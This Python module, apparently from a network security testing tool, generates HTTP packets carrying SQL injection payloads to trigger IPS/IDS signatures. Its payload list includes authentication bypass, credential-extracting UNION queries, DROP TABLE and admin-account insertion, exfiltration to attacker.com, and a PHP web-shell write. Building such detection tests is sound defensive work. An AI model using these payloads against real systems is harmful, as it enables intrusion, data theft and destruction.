"""SQL Injection pattern traffic module."""

from collections.abc import Iterator

from scapy.layers.inet import IP, TCP
from scapy.packet import Packet, Raw

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule

# Common SQL injection payloads that trigger IPS signatures
SQL_INJECTION_PAYLOADS = [
    # Basic authentication bypass
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "' OR 1=1--",
    "' OR 'x'='x",
    # Union-based injection
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT username, password FROM users--",
    "1' UNION SELECT ALL FROM information_schema.tables--",
    # Error-based injection
    "' AND 1=CONVERT(int, @@version)--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # Time-based blind injection
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT SLEEP(5)--",
    "' AND SLEEP(5)--",
    "1' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--",
    # Stacked queries
    "'; DROP TABLE users--",
    "'; INSERT INTO admin VALUES('hacker','password')--",
    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    # Out-of-band injection
    "'; EXEC master..xp_cmdshell 'ping attacker.com'--",
    "' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\a'))--",
    # NoSQL injection patterns
    "{'$gt': ''}",
    "{'$ne': null}",
    "admin'; return true; var dummy='",
    # Second-order injection
    "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php'--",
]


class SQLInjectionModule(TrafficModule):
    """Traffic module for SQL injection attack patterns.

    Generates HTTP requests containing SQL injection payloads
    in various parameters to trigger IPS/IDS signatures.
    """

    def __init__(self) -> None:
        """Initialize the SQL injection module."""
        self._payload_index = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="sql_injection",
            description="SQL injection attack patterns for IPS/IDS testing",
            category=TrafficCategory.IPS_IDS,
            protocols=["TCP", "HTTP"],
            ports=[80, 443, 8080, 3306, 5432, 1433],
        )

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate SQL injection packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port

        Yields:
            Scapy packets with SQL injection payloads
        """
        port = dst_port or 80

        # Get next payload (rotate through all payloads)
        payload = SQL_INJECTION_PAYLOADS[self._payload_index % len(SQL_INJECTION_PAYLOADS)]
        self._payload_index += 1

        # Create HTTP GET request with SQLi in parameter
        http_get = (
            f"GET /search?id={payload}&q=test HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=40000 + (self._payload_index % 25000), dport=port, flags="PA")
            / Raw(load=http_get.encode())
        )

        yield packet

        # Also create a POST request with SQLi in body
        post_body = f"username={payload}&password=test"
        http_post = (
            f"POST /login HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(post_body)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"{post_body}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=40000 + (self._payload_index % 25000), dport=port, flags="PA")
            / Raw(load=http_post.encode())
        )

        yield packet
